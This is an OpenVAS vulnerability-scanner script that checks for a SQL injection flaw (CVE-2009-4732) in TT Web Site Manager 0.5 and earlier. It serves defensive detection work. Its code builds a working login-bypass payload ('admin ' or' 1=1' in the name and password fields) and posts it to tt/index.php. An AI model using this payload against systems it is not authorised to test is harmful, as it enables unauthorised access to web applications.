###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ttwm_sql_inj_vuln.nasl 7806 2017-11-17 09:22:46Z cfischer $
#
# TT Web Site Manager 'tt_name' Remote SQL Injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow execution of arbitrary SQL
commands in the affected application.

Impact Level: Application";

tag_affected = "TT Web Site Manager version 0.5 and prior.";

tag_insight = "The flaw is due to input validation error in the 'tt/index.php'
script when processing the 'tt_name' parameter.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "The host is running TT web site manager and is prone to SQL injection
vulnerability.";

if(description)
{
  script_id(902135);
  script_version("$Revision: 7806 $");
  script_tag(name:"last_modification", value:"$Date: 2017-11-17 10:22:46 +0100 (Fri, 17 Nov 2017) $");
  script_tag(name:"creation_date", value:"2010-03-23 15:59:14 +0100 (Tue, 23 Mar 2010)");
  script_cve_id("CVE-2009-4732");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("TT Web Site Manager 'tt_name' Remote SQL Injection Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/36129");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9336");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2009/2128");

  script_tag(name:"qod_type", value:"remote_banner");
  script_copyright("Copyright (c) 2010 SecPod");
  script_category(ACT_MIXED_ATTACK);
  script_family("Web application abuses");
  script_dependencies("secpod_tt_website_manager_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

ttwmport = get_http_port(default:80);
if(!ttwmport){
  exit(0);
}

ttwmver = get_kb_item("www/" + ttwmport + "/TTWebsiteManager");
if(isnull(ttwmver)){
  exit(0);
}

ttwmver = eregmatch(pattern:"^(.+) under (/.*)$", string:ttwmver);
if(!isnull(ttwmver[2]))
{

  host = http_host_name(port:ttwmport);

  filename = string(ttwmver[2] + "/index.php");
  authVariables = "tt_name=admin+%27+or%27+1%3D1&tt_userpassword=admin+%27" +
                  "+or%27+1%3D1&action=Log+me+in";
  sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "Referer: http://", host, filename, "\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                   authVariables);
  rcvRes = http_send_recv(port:ttwmport, data:sndReq);
  if("location: ttsite.php" >< rcvRes)
  {
    security_message(ttwmport);
    exit(0);
  }
}

if(!isnull(ttwmver[1]))
{
  # TT Website Manager version <= 0.5
   if(version_is_less_equal(version:ttwmver[1], test_version:"0.5")){
    security_message(ttwmport);
  }
}
